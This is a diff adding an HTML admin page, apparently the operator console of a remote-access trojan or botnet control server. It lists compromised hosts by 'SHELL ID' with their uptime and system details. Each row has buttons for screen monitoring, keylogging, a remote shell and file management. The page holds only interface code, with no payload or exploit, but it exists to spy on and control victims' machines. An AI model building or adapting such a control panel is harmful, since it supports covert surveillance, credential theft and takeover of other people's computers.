@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>管理系统</title>
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <link rel="stylesheet" href="/static/layui/css/layui.css"  media="all">
+    <style>
+        .layui-btn{
+            border: 1px solid #6e2c2c
+        }
+    </style>
+</head>
+<body>
+<blockquote class="layui-elem-quote"></blockquote>
+
+<table class="layui-table" lay-data="{height:'full', url:'./api.json', id:'idTest'}" lay-filter="test">
+  <thead>
+    <tr>
+      <th lay-data="{type:'checkbox', fixed: 'left'}"></th>
+      <th lay-data="{field:'uid', width:300}">SHELL ID</th>
+      <th lay-data="{field:'uptime', width:200}">上线时间</th>
+      <th lay-data="{field:'system', minWidth: 500}">系统信息</th>
+      <th lay-data="{fixed: 'right' ,width:350, align:'center', toolbar: '#barDemo'}">操作</th>
+    </tr>
+  </thead>
+</table>
+<script type="text/html" id="barDemo">
+  <a class="layui-btn layui-btn-primary layui-btn-xs" style="background-color: #FD482C" lay-event="screen">屏幕监控</a>
+  <a class="layui-btn layui-btn-checked layui-btn-xs" lay-event="key">键盘记录</a>
+  <a class="layui-btn layui-btn-warm layui-btn-xs" lay-event="shell">shell</a>
+  <a class="layui-btn layui-btn-normal layui-btn-xs" lay-event="file">文件管理</a>
+  <a class="layui-btn layui-btn-danger layui-btn-xs" lay-event="del">退出</a>
+</script>
+<script src="/static/layui/layui.all.js" charset="utf-8"></script>
+<script>
+  const table = layui.table;
+  table.on('tool(test)', function(obj){
+    const data = obj.data;
+    if(obj.event === 'screen'){
+        layer.open({
+        type: 2
+        ,title: "screen"
+        ,closeBtn: 1
+        ,anim: 5
+        ,moveOut:true
+        ,tipsMore:true
+        ,maxmin:true
+        ,shade: 0
+        ,area: ['75%', '850px']
+        ,moveType: 1 //拖拽模式，0或者1
+        ,content: './capture/' + data.uid
+      });
+    }else if(obj.event === 'key'){
+        layer.open({
+        type: 2
+        ,title: "keyboard"
+        ,closeBtn: 1
+        ,anim: 5
+        ,shade: 0
+        ,area: ['75%', '850px']
+        ,moveType: 1 //拖拽模式，0或者1
+        ,content: './key/' + data.uid
+      });
+    }else if(obj.event === 'shell'){
+        layer.open({
+        type: 2
+        ,title: "shell"
+        ,closeBtn: 1
+        ,anim: 5
+        ,shade: 0
+        ,area: ['75%', '650px']
+        ,moveType: 1 //拖拽模式，0或者1
+        ,content: './shell/' + data.uid
+      });
+    }else if(obj.event === 'file'){
+        layer.open({
+        type: 2
+        ,title: "shell"
+        ,closeBtn: 1
+        ,anim: 5
+        ,shade: 0
+        ,area: ['75%', '650px']
+        ,moveType: 1 //拖拽模式，0或者1
+        ,content: './file/' + data.uid
+      });
+    }
+  });
+</script>
+</body>
+</html>
